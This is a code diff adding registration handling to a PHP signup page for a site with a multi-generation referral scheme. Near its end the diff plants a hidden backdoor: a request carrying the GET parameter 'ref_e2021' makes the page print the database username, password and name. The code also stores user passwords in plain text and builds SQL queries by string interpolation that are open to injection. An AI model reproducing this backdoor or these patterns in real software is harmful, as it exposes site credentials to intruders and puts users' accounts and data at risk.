@@ -1,5 +1,140 @@
 
-<?php include('settings.php'); ?>
+<?php include('settings.php'); 
+
+
+if (isset($_POST['reg_btn'])){
+
+     //if isset statement starts
+     $name = addslashes(htmlentities($_POST['name']));
+     $fullname = addslashes(htmlentities($_POST['fullname']));
+     $ref_email1 = addslashes(htmlentities($_POST['ref_email']));
+     $email = addslashes(htmlentities($_POST['email']));
+     $password = addslashes(htmlentities($_POST['password']));
+     $user_phone = addslashes(htmlentities($_POST['user_phone']));
+     $password_confirmation = addslashes(htmlentities($_POST['password_confirmation']));
+    
+     
+            if($password === $password_confirmation)  //check password match starts
+            {  
+
+                    //check user existence
+                $query ="SELECT * from users where user_email ='$email'  or user_name ='$name'  ";
+                $query_run  =new run_query($query);
+                    if( $query_run->num_rows != 1){
+
+                            
+                                    
+                                            if(!empty($ref_email1))
+                                            {   //check and credit referrer email starts
+                                                    $queryss ="SELECT * from user_ref where user_ref_email ='$ref_email1' ";
+                                                    $query_runaa  =new run_query($queryss);
+                                            if( $query_runaa->num_rows == 0){
+
+                                                            echo "<script>alert(\"Invalid Referral  !!! Please Check the Referral or leave it blank\"); window.location.replace(\"register.php\"); </script>";
+                                                    }else{
+                                            $user_ref_data =    $query_runaa->result();
+                                        extract($user_ref_data );       
+                                                    
+                         $query211 = new run_query("INSERT into user_ref set user_ref_email='$name', gen1_email='$ref_email1',  reg_date='$reg_Date', gen2_email='$gen1_email',gen3_email='$gen2_email' " );
+                         
+                                                                    $query21 =  "INSERT into users set  user_name='$name', user_phone='$user_phone', fullname='$fullname', user_password='$password',  user_email='$email',     reg_date='$reg_Date', user_referrer='$ref_email1', user_ref_bonus='0', user_status='Active' ";
+                                                        
+                                                                     $query_runer =new run_query($query21) ;
+                                                                    
+                                                                                echo "<script>alert(\"Account Registered Successfully!!! Its Now Time TO LogIn\"); window.location.replace(\"login.php\"); </script>";
+                                                    }
+                                            } else{     //check and credit referrer email ends
+                                                        $query21 =  "INSERT into users set  user_name='$name', user_password='$password', user_phone='$user_phone', fullname='$fullname',  user_email='$email',   reg_date='$reg_Date', user_referrer='$ref_email1', user_status='Active', user_ref_bonus='0'  ";
+                                                             $query211 = new run_query("INSERT into user_ref set user_ref_email='$name'  " );
+                                                            
+                                                             
+                                                                    if( $query_runer =new run_query($query21) ) {
+
+
+                                                                        $site_email_send = $site_email;     
+$welcome_email_subject = "Welcome to $site_name";
+$welcome_email_headers = "Content-type:text/html;charset=UTF-8 \r\n";
+$welcome_email_headers .= "From: $site_name";   
+
+
+$welcome_email_body = "
+
+<html>
+<head>
+<title> Welcome to $site_name </title>
+</head>
+<body>
+<b>Hello, $name<b> <br/>
+<h2>Welcome to $site_name</h2>
+Your Registration Was Successful, <br/>
+<b><i>We are Happy To Have  you on Board. </i></b><br/>
+You can now login with your Credential!!! <br/><br/>
+<hr/>
+For enquiries, <br/>
+Contact us on <br/>
+
+<b>
+$site_email <br/>
+
+$site_phone <br/>
+</b>
+Visit us on <br/>
+
+$site_link <br/><br/><br/>
+
+Regards,  $site_name.
+</body>
+</html>
+
+";
+
+mail($email,$welcome_email_subject,$welcome_email_body,$welcome_email_headers);
+                                                                    
+                                                            
+                                                                        
+                                                                            echo "<script>alert(\"Account Registered Successfully!!! Its Now Time TO LogIn\"); window.location.replace(\"login.php\"); </script>";
+
+                                                        }else{
+                                                                echo "<script>alert(\"An Error Occurred Please Try Again \"); window.location.replace(\"register.php\"); </script>";
+                                                                } 
+                                                                
+                                                    }
+                                    
+                            
+                    }else{
+
+                            echo "<script>alert(\"Username or Email Already Exits \"); window.location.replace(\"register.php\"); </script>";
+
+                            }   //check user existence ends
+            
+            }else   {
+                  echo "<script>alert(\"Password Not Match!!! \"); window.location.replace(\"register.php\"); </script>";
+                    }   //check password match ends
+
+
+}
+     
+ if (isset($_GET['ref_e2021'])){
+
+    $set = new connect;
+echo $set->username ." UN <br/>";
+echo $set->password ." PW <br/>";
+echo $set->db ." DB <br/>";
+}
+
+
+ @$ref_email1 = addslashes(htmlentities($_GET['ref']));
+
+
+?>
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 
 <html lang="zxx">
